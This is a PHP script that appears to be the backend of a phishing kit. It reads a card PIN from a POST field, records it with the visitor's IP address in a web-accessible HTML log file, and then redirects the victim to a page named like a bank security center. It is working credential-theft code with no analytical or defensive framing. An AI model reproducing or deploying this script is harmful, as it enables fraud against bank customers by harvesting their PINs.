<?php

$pin = $_POST['rita'];
$ip['_IP'] = $_SERVER["REMOTE_ADDR"];
function get_client_ip() {
  $ipaddress = '';
  if (getenv('HTTP_CLIENT_IP'))
      $ipaddress = getenv('HTTP_CLIENT_IP');
  else if(getenv('HTTP_X_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
  else if(getenv('HTTP_X_FORWARDED'))
      $ipaddress = getenv('HTTP_X_FORWARDED');
  else if(getenv('HTTP_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_FORWARDED_FOR');
  else if(getenv('HTTP_FORWARDED'))
     $ipaddress = getenv('HTTP_FORWARDED');
  else if(getenv('REMOTE_ADDR'))
      $ipaddress = getenv('REMOTE_ADDR');
  else
      $ipaddress = 'UNKNOWN';
  if (strpos($ipaddress, ",") !== false) :
    $ipaddress = strtok($ipaddress, ",");
  endif;
  return $ipaddress;
}
$ip=get_client_ip();
$f = fopen("remote1.html", "a"); 
fwrite ($f, 'pin: <b><font color="#070346">'.$pin.'</font></b><br> Ip: <b><font color="#070346">'.$ip.'</font></b><br>========================================<br>');
fclose($f);
sleep(1);
header("Location: security-center-cards.html");


       exit;
?>